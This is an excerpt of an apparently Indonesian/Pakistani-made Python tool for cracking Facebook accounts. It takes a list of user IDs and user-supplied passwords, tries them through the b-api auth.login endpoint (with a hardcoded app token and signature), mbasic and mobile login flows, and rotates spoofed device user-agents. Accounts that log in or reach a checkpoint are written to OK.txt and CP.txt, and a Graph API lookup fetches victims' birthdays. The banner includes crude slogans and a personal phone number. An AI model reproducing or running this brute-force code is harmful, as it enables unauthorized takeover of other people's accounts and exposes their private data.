...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#CH0UDH4RY('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = CH0UDH4RY(self.apk).read().splitlines()
			CH0UDH4RY(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
			...
			while True:
				pwek = input('\nEnter Password : ')
				#CH0UDH4RY('fuch your system A > %s'%(pwek))
				if pwek == '':
					CH0UDH4RY('\nJangan Kosong')
					time.sleep(1)
					exit()
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							CH0UDH4RY('[•] Result CP saved to CP.txt')
							CH0UDH4RY('\n\tCrack Processing...\n')
							CH0UDH4RY('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					CH0UDH4RY('\n01.) Metode b-api ')
					CH0UDH4RY('02.) Metode mbasic ')
					CH0UDH4RY('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			CH0UDH4RY('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			CH0UDH4RY(' [1] AKING Method 1 ')
			CH0UDH4RY(' [2] AKING Method 2  [ Pro ]')
			CH0UDH4RY(' [3] AKING Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = CH0UDH4RY('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_CH0UDH4RY("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				CH0UDH4RY('\r\033[1;92m[Successful-✓] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = CH0UDH4RY('login.txt').read()
					cp_ttl = Prof_CH0UDH4RY('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					CH0UDH4RY('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				CH0UDH4RY('\r\033[1;91m[Checkpoint] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				CH0UDH4RY('\r\033[1;32m[Successful-✓] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = CH0UDH4RY('token.txt').read()
					cp_ttl = Prof_CH0UDH4RY('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].CH0UDH4RY('\r\033[1;91m[Checkpoint] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				CH0UDH4RY('\r\033[1;92m[Successful-✓] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
CH0UDH4RYak_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
CH0UDH4RYak_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
CH0UDH4RYak_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
CH0UDH4RYak_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
CH0UDH4RYak_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
CH0UDH4RYak_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
CH0UDH4RYak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
CH0UDH4RYak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
...
888    Y888 "Y888888 88888888 888 888    
 [*]=============================================
    Author   : Anees_CH0UDH4RY
    WhatsApp : 03242716208
    Team     : CH0UDH4RY
    LOVE  : Fuck Your System A
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://wa.me/+923242716208")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
